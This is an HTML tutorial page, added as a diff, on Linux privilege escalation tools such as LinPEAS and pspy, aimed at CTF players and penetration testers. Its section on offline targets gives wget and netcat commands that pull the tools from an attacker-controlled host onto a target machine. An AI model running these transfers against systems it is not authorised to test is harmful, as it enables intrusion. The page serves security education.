@@ -1,0 +1,80 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Privilege Escalation Tools - Rare Code Base</title>
+
+  <meta name="description"
+    content="Discover the most effective tools for Linux privilege escalation, including LinPEAS, pspy, and Linux Exploit Suggester. Ideal for ethical hackers, penetration testers, and CTF enthusiasts looking to identify and exploit system weaknesses.">
+
+  <link rel="stylesheet" href="/css/styles.css">
+  <link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+  <script src="/js/main.js" defer></script>
+  <script src="/js/sidebar.js" defer></script>
+</head>
+
+<body>
+
+  <div id="navbar-placeholder"></div>
+
+  <main class="d-lg-flex flex-nowrap d-block">
+
+    <div id="sidebar-placeholder"></div>
+
+    <div class="content p-4">
+      <h1 class="mt-4">Linux Privilege Escalation Tools</h1>
+
+      <p>
+        While manual techniques are crucial for learning, tools make it easier to identify vulnerabilities quickly.
+        Below are some popular and effective tools used in real-world Linux privilege escalation scenarios.
+      </p>
+
+      <h2 class="mt-5">Top Tools You Should Know</h2>
+
+      <ul>
+        <li>LinPEAS</li>
+        <li>Linux Exploit Suggester 2</li>
+        <li>pspy</li>
+        <li>LES (Linux Exploit Suggester)</li>
+        <li>LinEnum</li>
+      </ul>
+
+
+      <h2 class="mt-5">What If the Target Machine Has No Internet?</h2>
+      <p>Internet connection not available? No worries — you can transfer tools manually from your machine to the
+        target. Here are a few ways:</p>
+
+      <h5>Option 1: Use Python HTTP Server (from attacker machine)</h5>
+      <pre><code># On your machine (in tool directory)
+python3 -m http.server 8000</code></pre>
+      <pre><code># On target machine
+wget http://<your-ip>:8000/linpeas.sh</code></pre>
+
+      <h5>Option 2: Use Netcat</h5>
+      <pre><code># On your machine
+nc -lvp 9001 < linpeas.sh</code></pre>
+      <pre><code># On target
+nc <your-ip> 9001 > linpeas.sh</code></pre>
+
+      <h5>Option 3: USB (in physical access scenarios)</h5>
+      <p>Mount USB, copy tool, and transfer it via <code>cp</code>.</p>
+
+
+      <p>Run scripts in <code>/tmp</code> or other writable directories on the target.</p>
+
+      <p class="mt-4">
+        These tools are especially useful in CTFs, bug bounty, and red teaming scenarios. But make sure you also
+        understand what each finding means — tools give results, but you need to turn those into action.
+      </p>
+    </div>
+
+  </main>
+
+  <div id="footer-placeholder"></div>
+
+</body>
+
+</html>
